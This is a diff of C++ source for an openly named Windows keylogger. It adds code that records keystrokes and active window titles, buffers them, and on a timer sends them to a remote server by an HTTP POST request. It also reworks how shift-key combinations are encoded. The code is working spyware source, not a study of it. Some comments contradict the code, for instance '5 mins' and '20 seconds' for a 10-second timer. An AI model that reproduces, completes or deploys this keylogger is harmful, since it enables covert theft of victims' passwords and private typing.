@@ -11,6 +11,14 @@ https://stackoverflow.com/questions/257134/weird-compile-error-dealing-with-winn
 #include <ctime>
 #include <stdlib.h>
 
+// a globally accessible string variable to store output to
+// for use by dataToOut
+extern std::string outputtedData = "";
+// start time
+extern time_t currTime = time(0);
+// start time + 5 mins
+extern time_t endTime = currTime + 10;
+
 std::string KeyLogger::returnForegroundWindow(HWND newWin)
 {
 	/*
@@ -18,17 +26,53 @@ std::string KeyLogger::returnForegroundWindow(HWND newWin)
 	*/
 	char winName[301];
 	GetWindowTextA(newWin, winName, 301);
-	std::cout << "window changed to " << winName << std::endl;
-	return winName;
+	return "\n"+(std::string)winName+"\n";
 }
 
-void KeyLogger::dataToOut(/*params will be keypress data and currently active window*/)
+void KeyLogger::dataToOut(std::string dataToSend)
 {
 	/*
 	Called whenever data needs to be outputted
 	Starting with a basic text file to begin with but will eventually output data straight through connection
 		a web server may be the easiest way to do this
+
+	1. output passed in data to out variable
+	2. check if start time + 5 minutes = current time
+		a. if true, call dataToServer
+		b. else do nothing
 	*/
+	outputtedData += dataToSend;
+	currTime = time(0);
+	if (endTime <= currTime) 
+	{
+		std::cout << "20 seconds passed" << std::endl;
+		// reset values of endTime and currTime
+		endTime = currTime + 10;
+		// call dataToServer
+		dataToServer(outputtedData);
+	}
+}
+
+void KeyLogger::dataToServer(std::string dataToSend)
+{
+	/*
+	responsible for sending data to remote server
+	This will be done through a web request
+	https://docs.microsoft.com/en-us/windows/win32/winhttp/winhttp-sessions-overview
+
+	https://stackoverflow.com/questions/38672719/post-request-in-winhttp-c
+	make post request
+	*/
+	RequestSender rSender = RequestSender();
+	std::cout << outputtedData << std::endl;
+	// converting std string to char*
+	outputtedData += '\r\n';
+	std::vector<char> outputToCharArr(outputtedData.c_str(), outputtedData.c_str() + outputtedData.size() + 1);
+	int outputSize = outputToCharArr.size();
+	// passes the memory address of the first char of output
+	rSender.sendDataAcross(&outputToCharArr[0], outputSize);
+	// clear outputted data after sending
+	outputtedData = "";
 }
 
 std::string KeyLogger::returnChar(char c) 
@@ -46,47 +90,47 @@ std::string KeyLogger::returnChar(char c)
 		return "!enter!";
 	case -69:
 		if (shiftPressed)
-			std::cout << "!shift!+";
+			return "!shift++!";
 		return "+";
 	case -36:
 		if (shiftPressed)
-			std::cout << "!shift!+";
+			return "!shift+\\!";
 		return "\\";
 	case VK_SUBTRACT:
 		if (shiftPressed)
-			std::cout << "!shift!+";
+			return "!shift+-!";
 		return "-";
 	case -66:
 		if (shiftPressed)
-			std::cout << "!shift!+";
+			return "!shift+.!";
 		return ".";
 	case -65:
 		if (shiftPressed)
-			std::cout << "!shift!+";
+			return "!shift+/!";
 		return "/";
 	case -70:
 		if (shiftPressed)
-			std::cout << "!shift!+";
+			return  "!shift+;!";
 		return ";";
 	case -64:
 		if (shiftPressed)
-			std::cout << "!shift!+";
+			return "!shift+'!";
 		return "'";
 	case -37:
 		if (shiftPressed)
-			std::cout << "!shift!+";
+			return "!shift+[!";
 		return "[";
 	case -35:
 		if (shiftPressed)
-			std::cout << "!shift!+";
+			return "!shift+]!";
 		return "]";
 	case -67:
 		if (shiftPressed)
-			std::cout << "!shift!+";
+			return "!shift+-!";
 		return "-";
 	case -68:
 		if (shiftPressed)
-			std::cout << "!shift!+";
+			return "!shift+,!";
 		return ",";
 	default:
 		int cAsInt = (int)c;
@@ -96,16 +140,17 @@ std::string KeyLogger::returnChar(char c)
 		{ 
 			return "!shift_or_accented_a!";
 		}
-		else if (shiftPressed) 
+		if (shiftPressed) 
 		{
-			if (std::isalpha(ch[0])) 
+			if (std::isalpha(ch[0]) > 0) 
 			{
 				// return character as is- capital
 				return ch;
 			}
-			std::cout << "!shift!+";
+			return "!shift+"+ch+"!";
 			// i could have also returned the character entered when pressing shift with digits; this is different from us to uk
 		}
+		// return lower case of character otherwise
 		ch = tolower(c);
 		return ch;
 	}
